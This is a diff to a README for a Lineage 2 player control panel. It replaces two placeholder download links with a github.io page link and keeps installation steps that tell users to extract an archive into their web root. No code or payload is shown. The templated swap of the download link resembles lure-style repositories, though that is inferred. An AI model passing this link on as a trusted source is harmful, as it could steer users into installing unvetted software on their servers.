@@ -2,7 +2,8 @@
 
 L2 Player Control Panel is a secure web-based interface that allows Lineage 2 players to manage their characters, view stats, change passwords, and perform key in-game actions from the browser.
 
-[![Download Panel](https://img.shields.io/badge/Download-L2_Control_Panel-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Panel](https://img.shields.io/badge/Download-L2_Control_Panel-blueviolet)](https://l2-player-control-panel.github.io/.github
+)
 
 ---
 
@@ -38,7 +39,8 @@ L2 Player Control Panel is a secure web-based interface that allows Lineage 2 pl
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://l2-player-control-panel.github.io/.github
+) section  
 2. 📁 **Extract files** to your web hosting directory (e.g., `/var/www/html/`)  
 3. ⚙️ **Configure database settings** in `config.php`  
 4. 🖱 **Access the panel** via browser and log in with your L2 account
